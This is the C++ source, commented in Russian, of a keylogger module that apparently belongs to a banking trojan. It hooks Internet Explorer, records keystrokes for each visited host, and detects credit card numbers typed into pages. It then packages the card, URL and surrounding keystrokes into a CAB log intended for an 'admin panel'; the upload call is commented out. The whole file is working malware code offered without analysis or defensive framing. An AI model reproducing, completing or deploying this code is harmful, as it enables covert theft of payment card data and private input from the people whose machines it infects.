#include "BotDebug.h"

namespace DBGCC
{
	#include "DbgTemplates.h"
}

#define CCDBG DBGCC::DBGOutMessage<>

#define CCModule //говорим что модуль включен

//функция нахождения номера карточки, она определена в файле CreditCardNomber.cpp
int FindCreditCard( char* pSrc, int szSrc, int fromSrc, char* pDst, int& posEnd );
//перевод непечатаемого символа в текстовое его описание, определена в файле UniversalKeyLogger.cpp
bool GetNonPrintCharText(DWORD Char, PCHAR &Buf);

namespace CC
{

struct UrlKeys
{
	char url[64]; //домен на котором набиты клавиши
	char keys[256]; //коды введенных символов
	int endPos; //позиция последнего введенного символа 
	char numCard[24]; //номер найденной карты
	int posCard; //позиция найденной карты в массиве keys (-1 - карта не найдена)
	int posEndCard; //позиция последней цифры найденного номера карты
};

UrlKeys* currData; //куда пишется поток клавиш
PList listData; //список логгируемых урлов

static UrlKeys* AddUrl( const char* url )
{
	UrlKeys* uk = (UrlKeys*)MemAlloc( sizeof(UrlKeys) );
	if( uk == 0 ) return 0;
	int len = m_lstrlen(url);
	if( len >= sizeof(uk->url) ) len = sizeof(uk->url) - 1;
	m_memcpy( uk->url, url, len );
	uk->url[len] = 0;
	uk->endPos = -1;
	uk->posCard = -1;
	return uk;
}

static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	TURLREC UR;
	if( ParseURL( (char*)Data, &UR, false ) )
	{
		//ищем новый урл в списке
		int count = List::Count(listData);
		currData = 0;
		for( int i = 0; i < count; i++ )
		{
			UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
			if( m_lstrcmp( uk->url, UR.Host ) == 0 )
			{
				currData = uk;
				break;
			}
		}
		if( currData == 0 ) //такого урла еще не было, добавляем
			currData = AddUrl(UR.Host);
		ClearURL(&UR);
	}
	//если по какой-то причине урл не был найден или не был добавлен, то указываем по умолчанию неизвестный
	if( currData == 0 )
		currData = (UrlKeys*)List::GetItem( listData, 0 );
	CCDBG( "CC", "логируем урл %s", currData->url );
}

static char* CharToHex( unsigned char c, char* buf )
{
	buf[0] = '{';
	buf[1] = '0';
	buf[2] = 'x';
	int v = c >> 4;
	buf[3] = v <= 9 ? '0' + v : 'A' + v - 10;
	v = c & 0xf;
	buf[4] = v <= 9 ? '0' + v : 'A' + v - 10;
	buf[5] = '}';
	buf[6] = 0;
	return buf;
}

static void SendLog( UrlKeys* uk )
{
	CCDBG( "CC", "Найдена карточка %s, позиция %d, урл: '%s'", uk->numCard, uk->posCard, uk->url );
	char* mem = (char*)MemAlloc( sizeof(uk->keys) * 5 + 128 );
	fwsprintfA pwsprintf = Get_wsprintfA();
	pwsprintf( mem, "Url: %s\nFinded card: %s\nLogged keys: ", uk->url, uk->numCard );

	int delim = 0; //вставка квадратных скобок для выделения номера карты
	for( int i = 0; i <= uk->endPos; i++ )
	{
		char* buf;
		unsigned char c = uk->keys[i];
		//выделяем номер карты в нужных позициях
		if( i == currData->posCard && delim == 0 )
		{
			c = '[';
			i--;
			delim++;
		}
		if( i == currData->posEndCard + 1 && delim == 1 )
		{
			c = ']';
			i--;
			delim++;
		}
		if( GetNonPrintCharText( c, buf ) )
		{
			m_lstrcat( mem, buf );
			STR::Free(buf);
		}
		else
		{
			char buf[16];
			if( (unsigned char)uk->keys[i] < 32 )
			{
				CharToHex( c, buf );
			}
			else
			{
				buf[0] = c;
				buf[1] = 0;
			}
			m_lstrcat( mem, buf );
		}
	}
	int len = m_lstrlen(mem);
	char cabFile[MAX_PATH];
	File::GetTempName(cabFile);
	HCAB cab = CreateCab(cabFile);
	AddBlobToCab( cab, mem, len, "LogFile.txt" );
	CloseCab(cab);
//	CCDBG( "CC", "CAB сохранен в файле %s", cabFile );
//	DataGrabber::SendCabDelayed( 0, cabFile, "CC" );
	pDeleteFileA(cabFile);
	MemFree(mem);
	//очищаем буфер
	uk->endPos = -1;
	uk->posCard = -1;
}

static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	char* keys = (char*)Data;
	while( *keys )
	{
		currData->endPos++;
		if( currData->endPos >= sizeof(currData->keys) ) //буфер заполнен, сдвигаем его, удаляя 1-й символ
		{
			m_memcpy( currData->keys, currData->keys + 1, sizeof(currData->keys) );
			currData->endPos--;
			if( currData->posCard >= 0 ) currData->posCard--; //позиция карточки тоже сместилась
		}
		currData->keys[currData->endPos] = *keys;
		
		if( currData->posCard >= 0 ) //карточка найдена
		{
			//если после номера карточки ввели более 100 символов, посылаем лог в админку
			if( currData->endPos - currData->posCard >= 100 )
				SendLog(currData);
		}
		else //карточка еще не найдена
		{
			if( currData->endPos > 100 ) //начинаем определять карточку только после ввода 100 символов
			{
				currData->posCard = FindCreditCard( currData->keys, currData->endPos, 0, currData->numCard, currData->posEndCard );
				if( currData->posCard >= 0 )
				{
					CCDBG( "CC", "определили карту %s", currData->numCard );
				}
			}
		}
		keys++;
	}
}


bool Init(DWORD hashApp)
{
	PKeyLogSystem S = KeyLogger::AddSystem("CC", PROCESS_HASH_IE);
	if( S != NULL )
	{
		S->TimeMode = KLG_TIME_INFINITE;
		PKlgWndFilter F = KeyLogger::AddFilter(S, false, false, "*", "*", FILTRATE_ALL_WND, LOG_KEYBOARD, 5);
		listData = List::Create();
		//добавляем элемент где будут логгироваться клавиши когда урл неизвестен
		currData = AddUrl("Unknow url");
		if( currData )
		{
			KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, URLChanged);
			KeyLogger::ConnectEventHandler(KLE_ADD_TEXT_LOG, PushedKey);
			CCDBG( "CC", "Система СС запущена" );
			return true;
		}
	}
	return false;
};

}

